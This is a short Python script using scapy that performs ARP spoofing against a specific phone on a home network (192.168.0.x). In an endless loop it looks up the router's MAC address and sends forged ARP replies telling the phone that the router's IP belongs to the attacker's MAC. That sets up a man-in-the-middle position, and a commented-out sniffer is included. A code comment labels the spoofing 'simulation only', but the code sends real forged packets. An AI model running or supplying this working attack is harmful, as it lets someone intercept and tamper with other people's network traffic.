from scapy.all import ARP, Ether, srp, send, sniff
while True:
    # Your device info
    your_mac = "04:ec:d8:47:08:0b"  # MAC of wlan0
    your_ip = "192.168.0.133"       # IP of wlan0

    # Router info
    router_ip = "192.168.0.1"

    # Mobile device info
    mobile_ip = "192.168.0.130"
    mobile_mac = "60:ff:9e:51:c6:d8"

    # 1️⃣ Send ARP request to router
    def send_arp_request_to_router():
        arp_req = ARP(pdst=router_ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp_req
        ans = srp(packet, timeout=2, verbose=False)[0]
        for _, rcv in ans:
            print(f"[Router] IP: {rcv.psrc}, MAC: {rcv.hwsrc}")

    # 2️⃣ Send ARP reply to mobile (simulation only)
    def send_arp_reply_to_mobile():
        arp_reply = ARP(op=2, pdst=mobile_ip, hwdst=mobile_mac, psrc=router_ip, hwsrc=your_mac)
        send(arp_reply, verbose=True)
        print(f"[Simulated] Sent ARP reply to {mobile_ip} claiming {router_ip} is at {your_mac}")

    # # 3️⃣ Sniff ARP traffic (optional)
    # def sniff_arp_packets():
    #     def process(pkt):
    #         if pkt.haslayer(ARP):
    #             print(f"[Sniffed] {pkt[ARP].psrc} is at {pkt[ARP].hwsrc}")
    #     sniff(filter="arp", prn=process, store=0, count=10)

    # Run all
    while(True):
        send_arp_request_to_router()
        send_arp_reply_to_mobile()
# sniff_arp_packets()
